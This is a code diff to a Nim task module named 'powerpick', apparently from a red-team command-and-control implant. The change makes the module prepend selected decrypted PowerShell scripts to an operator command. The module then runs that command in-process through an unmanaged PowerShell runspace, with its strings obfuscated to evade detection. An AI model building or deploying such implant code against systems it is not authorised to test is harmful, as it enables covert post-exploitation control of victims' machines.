@@ -5,6 +5,7 @@ when defined(windows):
   import winim/clr except `[]`
   import winim/lean
   import ../utils/patches
+  import ../global_data
   
   type
     PowerpickArgs = object
@@ -61,6 +62,26 @@ proc powerpick*(taskId: string, params: JsonNode): JsonNode =
         else:
           discard
       
+      # Build the full script: selectively prepend imported scripts, then the command
+      var fullScript = ""
+
+      # Parse optional scripts parameter
+      var scripts: seq[string] = @[]
+      if params.hasKey(obf("scripts")):
+        for item in params[obf("scripts")]:
+          scripts.add(item.getStr())
+
+      if scripts.len > 0:
+        # Selective loading: only decrypt and load specified scripts
+        let selectedScripts = getImportedPsScriptsByNames(scripts)
+        if selectedScripts.len > 0:
+          output.add(obf("[*] Loading ") & $selectedScripts.len & obf(" selected script(s)...\n"))
+          for script in selectedScripts:
+            fullScript.add(script.content)
+            fullScript.add("\n")
+      
+      fullScript.add(args.command)
+      
       # Load System.Management.Automation and create runspace
       output.add(obf("[*] Creating PowerShell runspace...\n"))
       let Automation = load(obf("System.Management.Automation"))
@@ -70,7 +91,7 @@ proc powerpick*(taskId: string, params: JsonNode): JsonNode =
       var pipeline = runspace.CreatePipeline()
       
       runspace.Open()
-      pipeline.Commands.AddScript(args.command)
+      pipeline.Commands.AddScript(fullScript)
       pipeline.Commands.Add(obf("Out-String"))
       
       output.add(obf("[*] Executing command...\n"))
